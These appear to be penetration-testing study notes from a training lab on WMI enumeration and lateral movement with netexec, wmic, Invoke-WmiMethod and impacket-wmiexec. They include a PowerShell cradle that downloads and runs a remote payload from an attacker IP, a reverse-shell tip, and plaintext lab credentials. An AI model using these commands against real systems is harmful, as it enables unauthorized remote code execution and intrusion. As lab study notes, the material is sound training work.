## What is?
(WMI) is a powerful Windows feature that provides a standardized way to interact with system management information and manage devices and applications in a networked environment. WMI can be used to query system information, configure system settings, and perform administrative tasks on remote machines. It is particularly useful for automation, monitoring, and scripting tasks. WMI communication primarily uses TCP port `135` for the initial connection and dynamically allocated ports in the range `49152-65535` for subsequent data exchange.


## How to enumerate?
```shell-session
netexec wmi 10.129.229.244 -u helen -p RedRiot88
RPC         10.129.229.244  135    SRV01            [*] Windows 10 / Server 2019 Build 17763 (name:SRV01) (domain:inlanefreight.local)
RPC         10.129.229.244  135    SRV01            [+] inlanefreight.local\helen:RedRiot88
```


## Lateral Movement via WMI(Windows FRIENDLY)
(Execute a remote command on PowerShell via WMI)
```powershell-session
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName 172.20.0.52
```
(Same can be obtained from DOS)
```powershell-session
 wmic /user:username /password:password /node:172.20.0.52 os get Caption,CSDVersion,OSArchitecture,Version
```
(If you need to send it with other credentials from another user's session)
```powershell-session
$credential = New-Object System.Management.Automation.PSCredential("username", (ConvertTo-SecureString "password" -AsPlainText -Force));
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "notepad.exe" -ComputerName 172.20.0.52 -Credential $credential
```
(Alternatively getting a RCE via Meterpreter session hidden i  a Powershell script)
```powershell-session
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.207/s')" -ComputerName 172.20.0.52
```


## Lateral Movement via WMI(Linux FRIENDLY)
(Run a query to WMI directly from Linux)
```shell-session
netexec wmi 172.20.0.52 -u helen -p RedRiot88 --wmi "SELECT * FROM Win32_OperatingSystem"
```
(Getting code execution directly from Windows)
```shell-session
netexec wmi 172.20.0.52 -u helen -p RedRiot88 -x whoami

//OR via impacket script
impacket-wmiexec inlanefreight/helen:RedRiot88@172.20.0.52 whoami
```
(*OBS:* If port TCP/445 is blocked then you can use `-nooutput` to omit the outputting of the result, useful if we just need to invoke a command without caring to see the result on screen. Ex. Invokig a reverse shell.)
